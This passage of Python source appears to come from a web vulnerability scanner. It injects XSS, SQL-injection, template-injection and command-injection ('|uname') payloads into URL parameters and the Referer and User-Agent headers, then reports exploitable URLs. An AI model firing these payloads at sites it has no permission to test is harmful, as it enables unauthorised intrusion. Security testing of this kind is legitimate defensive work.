			te=requests.get(url,headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
			fir = re.findall('36'.encode('utf-8'),te.content)
			for params in url.split("?")[1].split("&"):
				payloads=['{{6*6}}','<%= 6 * 6 %>','${6*6}']
				for payload in payloads:
					for h in range(deco):
						payload=urlencoder(payload)
					sleep(slp)
					r=requests.get(url.replace(params, params + str(payload).strip()),headers={'User-agent':uagent(cagent=cagent)},cookies=co,verify=vert,allow_redirects=redir,timeout=tim,proxies=proxy)
					ch = re.findall('36'.encode('utf-8'),r.content)
					if len(ch) > len(fir):
						j=url.replace(params, params + str(payload).strip())
						print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template Injection
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Param : {params}
{bold}{info}{bold} Exploit : {j}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
						if batch:
							print('\n Continue ? [Y,n] Y')
						else:
							cont = input('\n Continue ? [Y,n]').lower()
							if cont != '':
								exit()
							elif cont != 'y':
								exit()
						x = 1
						break
				if x == 0:
					logger.info('Not vulnerable from SSTI With GET Method')
class webscraper: # web scraper modules .. coming soon ^_^
	def __init__(self):
		pass
	def geturls(self,url):
		pass # This module Bulid To Dump All urls in page EX : (<a href='target.com/login.php')
	def getforms(self,url):
		pass # This module Build To Dump all forms and parameters in The Page
class headers_scanner: # Header Scanner Module ;-;
	def __init__():
		pass
	def referrer_xss(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		deco = deco - 1
		payloads=["<img src=x onerror=alert(1)>",'">ScanT3r<svg/onload=confirm(/ScanT3r/)>web',"'><img src=x onerror=alert(1)>"]
		for payload in payloads:
			if method == 'get':
				sleep(slp)
				r = requests.get(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				if payload.encode("utf-8") in r.content:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}{bold}GET{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				elif payload.encode("utf-8") in r2.content:
					print(f"""
{bold}{good}{bold} Bug Found : XSS (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}{bold}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}""")
					break
				else:
					continue
			else:
				sleep(slp)
				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{url} {payload}"},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				if payload.encode('utf-8') in r.content:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				else:
					continue
	def referrer_sqli(url,cagent=None,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,proxy=None,slp=0,batch=None):
		payload=''''"'''
		if method == 'get':
			sleep(slp)
			rr = requests.get(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			rr2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			r = requests.get(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,proxies=proxy,cookies=cookie)
			sleep(slp)
			r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			for d,e in errors.items():
				cch = re.findall(e.encode('utf-8'),rr.content)
				cch2 = re.findall(e.encode('utf-8'),rr2.content)
				ch = re.findall(e.encode('utf-8'),r.content)
				ch2 = re.findall(e.encode('utf-8'),r2.content)
				if len(cch) < len(ch):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}GET{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				elif len(cch2) < len(ch2):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				else:
					continue
		else:
			sleep(slp)
			r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			r = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			for d,e in errors.items():
				cch = re.findall(e.encode('utf-8'),r2.content)
				ch = re.findall(e.encode('utf-8'),r.content)
				if len(cch) < len(ch):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				else:
					continue
	def referrer_rce(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		payloads = ["'|uname %23",'"|uname %23',"|uname %23"]
		for payload in payloads:
			if method == 'get':
				sleep(slp)
				rr = requests.get(url,headers={"User-agent":uagent(cagent=cagent,one=True)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				rr2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r = requests.get(url,headers={"User-agent":uagent(cagent=cagent,one=True,payload=payload),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				cch = re.findall("Linux".encode('utf-8'),rr.content)
				cch2 = re.findall("Linux".encode("utf-8"),rr2.content)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				ch2 = re.findall("Linux".encode("utf-8"),r2.content)
				if len(ch) > len(cch):
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}GET{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
				elif len(ch2) > len(cch2):
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			else:
				sleep(slp)
				r2 = requests.post(url,headers={'User-agent':uagent(cagent=cagent,one=True)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r = requests.post(url,headers={'User-agent':uagent(cagent=cagent,one=True),"referrer":f"{payload}"},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				ch = re.findall("Linux".encode("utf-8"),r.content)
				cch = re.findall("Linux".encode("utf-8"),r2.content)
				if len(ch) > len(cch):
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
	def referrer_ssti(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		payloads=['{{ 6*6 }}','<%= 6 * 6 %>','${6*6}']
		for payload in payloads:
			if method == 'get':
 				sleep(slp)
 				rr = requests.get(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				sleep(slp)
 				rr2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				sleep(slp)
 				r = requests.get(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				sleep(slp)
 				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
 				cch = re.findall("36".encode('utf-8'),rr.content)
 				cch2 = re.findall("36".encode("utf-8"),rr2.content)
 				ch = re.findall('36'.encode('utf-8'),r.content)
 				ch2 = re.findall("36".encode("utf-8"),r2.content)
 				if len(ch) > len(cch):
 					print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{yellow}{bold}GET{end}{bold}]
{bold}{info}{bold} URL : {url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
 					break
 				elif len(ch2) > len(cch2):
 					print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{yellow}{bold}POST{end}{bold}]
{bold}{info}{bold} URL : {url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
 					break
			else:
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent),"referrer":f"{payload}"},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				ch = re.findall("Linux".encode("utf-8"),r.content)
				cch = re.findall("Linux".encode("utf-8"),r2.content)
				if len(ch) > len(cch):
					print (f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Template Injection (in referrer header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{yellow}{bold}POST{end}{bold}]
{bold}{info}{bold} URL : {url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
	def user_agent_xss(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
		for payload in payloads:
			if method == 'get':
				sleep(slp)
				r = requests.get(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				if payload.encode('utf-8') in r.content:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}GET{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				elif payload.encode('utf-8') in r2.content:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
			else:
				sleep(slp)
				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				if payload.encode('utf-8') in r.content:
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : XSS (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
	def user_agent_sqli(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		payload='"'
		if method == 'get':
			sleep(slp)
			rr = requests.get(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			rr2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			r = requests.get(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,proxies=proxy,cookies=cookie)
			sleep(slp)
			r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,proxies=proxy,cookies=cookie)
			for d,e in errors.items():
				cch = re.findall(e.encode('utf-8'),rr.content)
				cch2 = re.findall(e.encode("utf-8"),rr2.content)
				ch = re.findall(e.encode('utf-8'),r.content)
				ch2 = re.findall(e.encode("utf-8"),r2.content)
				if len(ch) > len(cch):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}GET{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
				elif len(ch2) > len(cch2):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")					
					break
		else:
			sleep(slp)
			r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			sleep(slp)
			r = requests.post(url,headers={"User-agent":uagent(cagent=cagent,payload=payload)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
			for d,e in errors.items():
				ch = re.findall(e.encode("utf-8"),r.content)
				cch = re.findall(e.encode("utf-8"),r2.content)
				if len(ch) > len(cch):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : SQL Injection (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} Error : {e}
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
					break
	def user_agent_rce(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
		payloads = ["'|uname %23",'"|uname %23',"|uname %23"]
		for payload in payloads:
			if method == 'get':
				sleep(slp)
				rr = requests.get(url,headers={"User-agent":uagent(cagent=cagent,one=True)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				rr2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r = requests.get(url,headers={"User-agent":uagent(cagent=cagent,one=True,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True,payload=payload)},timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				cch = re.findall('Linux'.encode('utf-8'),rr.content)
				cch2 = re.findall('Linux'.encode("utf-8"),rr2.content)
				ch = re.findall('Linux'.encode('utf-8'),r.content)
				ch2 = re.findall('Linux'.encode("utf-8"),r2.content)
				if len(ch) > len(cch):
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}GET{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
				elif len(ch2) > len(cch2):
						print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
			else:
				sleep(slp)
				r2 = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				sleep(slp)
				r = requests.post(url,headers={"User-agent":uagent(cagent=cagent,one=True,payload=payload)},data=date,timeout=timeo,verify=vert,allow_redirects=redir,cookies=cookie,proxies=proxy)
				ch = re.findall('Linux'.encode("utf-8"),r.content)
				cch = re.findall('Linux'.encode("utf-8"),r2.content)
				if len(ch) > len(cch):
					print(f"""
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
{bold}{good}{bold} Bug Found : Remote Code Execution (in User-agent header)
{bold}{info}{bold} Payload : {payload}
{bold}{info}{bold} Method : [{end}{yellow}POST{end}{bold}]
{bold}{info}{bold} URL : {r.url}{end}
\033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}
""")
